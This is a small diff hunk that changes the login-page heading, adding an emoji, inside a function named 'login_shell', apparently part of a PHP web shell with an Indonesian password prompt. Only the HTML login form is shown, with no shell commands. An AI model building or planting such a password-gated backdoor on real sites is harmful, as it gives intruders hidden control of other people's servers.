@@ -33,7 +33,7 @@ function login_shell() {
 <center>
 <header><br><br><br><br><br>
 <img src="https://ia801504.us.archive.org/6/items/img20200128181829/IMG_20200128_181829.jpg" border="0"width="550px" height="320px">
-<br><br><br><br><br><b>Silahkan Login!!!</b><br><br><br>
+<br><br><br><br><br><b>Silahkan Login! &#128535;</b><br><br><br>
 </header>
 <form method="post">
 <input type="password" name="pass">
